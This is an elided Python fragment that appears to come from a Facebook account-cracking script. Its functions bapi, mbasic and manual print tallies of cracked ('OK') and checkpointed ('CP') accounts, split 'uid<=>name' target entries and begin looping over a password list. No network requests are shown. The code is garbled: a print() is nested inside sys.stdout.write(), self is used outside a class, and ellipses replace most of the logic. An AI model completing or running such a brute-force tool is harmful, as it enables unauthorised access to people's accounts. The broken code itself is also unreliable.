...
def bapi(user):
	...
	sys.stdout.write(
                ...
                print('\r %sSTAR %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
...
def mbasic(user):
	...
	global loop, token
	sys.stdout.write(
		"\r\033[0;91m[\033[0;92mProcess] \033[0;92m•••>\033[0;93m %s/%s •••> OK:-%s ••• CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
...
def manual():
	...
	def main(user):
		global loop, token
		sys.stdout.write(
			"\r\033[0;92m[\033[0;96mProcess \033[0;92m•••>\033[0;96m %s/%s •••> OK:-%s ••• CP:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		try:
			for pw in asu:
